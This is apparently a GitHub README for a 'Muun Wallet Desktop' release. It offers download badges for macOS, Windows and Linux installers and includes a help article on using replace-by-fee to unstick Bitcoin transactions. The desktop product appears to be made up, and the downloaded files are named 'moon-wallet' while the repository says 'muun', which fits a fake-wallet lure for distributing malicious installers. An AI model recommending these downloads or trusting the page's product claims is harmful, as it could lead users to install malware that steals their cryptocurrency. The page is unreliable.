[![Muun Wallet](https://img.shields.io/badge/Muun%20Wallet-Desktop-blue)](https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1) [![Platforms](https://img.shields.io/badge/platforms-macOS%20%7C%20Windows%20%7C%20Linux-lightgrey)](https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1) [![License](https://img.shields.io/badge/license-MIT-green)](https://github.com/muun-network/muun-wallet/blob/main/LICENSE)

[![macOS](https://img.shields.io/badge/Download-macOS-black?logo=apple&logoColor=white)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.dmg) [![Windows](https://img.shields.io/badge/Download-Windows-0078d4?logo=windows&logoColor=white)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.exe) [![Linux](https://img.shields.io/badge/Download-Linux-f5a623?logo=linux&logoColor=white)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.zip)

---

# How to Fix a Stuck Bitcoin Transaction in Muun Wallet (RBF)

A stuck Bitcoin transaction is one that has been broadcast to the network but remains unconfirmed for much longer than expected. This happens when the fee rate you paid at the time of sending is now below the current mempool's minimum for inclusion in the next block — essentially, your transaction is sitting in the queue while higher-fee transactions jump ahead of it.

Muun Wallet Desktop includes replace-by-fee (RBF) as a built-in feature to resolve this without any external tool or support ticket.

---

## Why transactions get stuck

When you send a Bitcoin transaction, you set a fee rate (satoshis per virtual byte, or sat/vB) that signals to miners how urgently you want confirmation. If the mempool is relatively quiet when you send, a low fee rate gets confirmed quickly. If mempool congestion spikes afterward — which can happen within minutes during busy periods — your transaction sits in the queue while miners prioritize higher-paying transactions.

The transaction is not lost. It remains valid and will eventually confirm once congestion drops, or once you raise the fee with RBF. Nothing is stuck permanently — but "eventually" can mean hours or days during sustained high-fee periods.

---

## What RBF does

Replace-by-fee allows you to broadcast a new version of your transaction with a higher fee rate, superseding the original. Most nodes and miners on the Bitcoin network accept RBF-signalling transactions, so the higher-fee replacement reaches miners quickly and is prioritized over the lower-fee original.

RBF does not create a new send or duplicate the payment — it replaces the original transaction with an identical one at a higher fee, spending from the same inputs to the same outputs. The recipient receives exactly the same amount; only the fee increases.

---

## How to use RBF in Muun Wallet Desktop

1. Open Muun Wallet Desktop and navigate to your transaction history or the home screen.
2. Find the pending transaction — it will show a status of "Unconfirmed" or "Pending" rather than a block confirmation count.
3. Click or tap the transaction to open its detail view.
4. Look for the "Speed up" or "Bump fee" button in the transaction detail. This appears on pending transactions that were broadcast with RBF enabled (all Muun Wallet Desktop transactions are sent with RBF signalling enabled by default).
5. Muun shows you the new proposed fee rate based on current mempool conditions, and the total additional cost to bump the transaction.
6. Confirm the bump. Muun broadcasts the replacement transaction immediately.

The original transaction becomes invalid once the replacement is broadcast. Your transaction history will update to show the replacement once it confirms.

---

## How long does the replacement take to confirm?

If you choose the fee rate suggested by Muun's mempool estimator for the replacement, the transaction is typically included in the next block or two — usually within thirty minutes. If the mempool moves again while the replacement is pending, you can apply RBF a second time.

---

## What if the "Speed up" button does not appear?

This can happen if:

- The transaction was not originally broadcast with RBF signalling (uncommon with Muun Wallet Desktop, but possible on imported or legacy wallets).
- The transaction has already been confirmed (check the block count in the detail view).
- The transaction is in a Lightning-side state rather than a standard on-chain transaction.

If none of these apply and the button is still missing, open an [issue on GitHub](https://github.com/muun-network/muun-wallet/issues) with the transaction ID from the detail view.

---

## For Lightning payments that failed or are stuck

If a Lightning payment sent from Muun Wallet appears to have left your balance but has not completed, this is usually because the on-chain swap leg of the submarine swap is pending confirmation. The transaction status screen in Muun Wallet Desktop shows which stage the swap is in. If the on-chain leg is pending, you can apply RBF to it the same way as any other on-chain transaction. If the swap has already been broadcast but the Lightning side failed, Muun's refund mechanism will return the on-chain funds to your balance once the relevant timelock expires — this is automatic and does not require any action from you.

For more on how the Lightning and swap layer interacts with fees, see the [Lightning fees guide](muun-wallet-lightning-fees-explained.md).

---

## Preventing stuck transactions

The best way to avoid a stuck transaction is to review Muun's fee estimate before confirming and avoid sending at an unusually low fee during periods of obvious congestion. The live estimate shown before confirmation tells you what the mempool currently expects for timely inclusion. If that number is high and you can afford to wait, cancelling and retrying during a quieter period can save significant fee cost.

---

## Related articles

- [Muun Wallet fees explained](muun-wallet-fees-explained.md)
- [Muun Wallet Lightning fees explained](muun-wallet-lightning-fees-explained.md)
- [What is a submarine swap?](what-is-a-submarine-swap.md)
- [Muun Wallet review 2026](muun-wallet-review-2026.md)
- [Is Muun Wallet safe?](is-muun-wallet-safe.md)
